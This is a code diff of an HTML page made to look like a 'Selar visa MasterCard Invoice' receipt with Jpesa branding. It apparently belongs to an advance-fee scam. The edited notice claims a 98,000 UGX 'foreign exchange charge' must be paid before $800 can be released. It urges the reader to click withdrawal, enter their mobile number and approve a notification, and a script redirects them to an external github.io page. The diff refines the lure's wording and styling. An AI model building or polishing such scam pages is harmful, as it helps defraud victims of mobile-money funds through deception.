@@ -99,17 +99,15 @@
 
         .user-info-header { font-weight: bold; color: var(--dark-text); margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 5px; }
         
-        /* Updated design for the charge notification */
-        .charge-design {
+        .alert-design {
             background: #fff5f5;
-            border: 2px dashed var(--jpesa-red);
+            border: 2px solid var(--jpesa-red);
             padding: 15px;
             border-radius: 10px;
             text-align: center;
-            color: var(--jpesa-red);
-            font-weight: bold;
-            line-height: 1.5;
+            color: #333;
             font-size: 0.9rem;
+            line-height: 1.4;
         }
     </style>
 </head>
@@ -117,7 +115,7 @@
 
 <div class="container" id="app">
     <div class="top-banner">
-        <div style="background: white; padding: 5px; border-radius: 4px; display: flex; align-items: center; cursor: default;">
+        <div style="background: white; padding: 5px; border-radius: 4px; display: flex; align-items: center;">
             <span style="color:#0033a0; font-weight:bold; font-size: 10px;">Selar visa MasterCard Invoice</span>
         </div>
     </div>
@@ -153,8 +151,8 @@
         </div>
 
         <div id="mainNotif" class="receipt-card">
-            <div id="notifContent" class="charge-design">
-                Foreign exchange charge needed 98,000UGX to allow 800$ into UGX, Click withdrawal then on the next page fill in your mobile number 07XXX and you allow notification to deposit invoice transaction on Your mobile number account
+            <div id="notifContent" class="alert-design">
+                <b style="color: var(--jpesa-red);">Action Required:</b> Foreign exchange charge needed <b>98,000UGX</b> to allow 800$ into UGX. Click withdrawal then on the next page fill in your mobile number <b>07XXX</b> and allow notification to deposit invoice transaction on your mobile number account.
             </div>
         </div>
 
@@ -225,14 +223,8 @@
         document.getElementById('userInfoDisplay').innerText = `${state.name} | ${state.phone}`;
     }
 
-    // Updated to redirect directly to the provided link
     function handleAction() {
         window.location.href = "https://lolisys.github.io/9selar/";
-    }
-
-    // Removed the clickable logic for the banner
-    function configEpay() {
-        return false;
     }
 </script>
 </body>
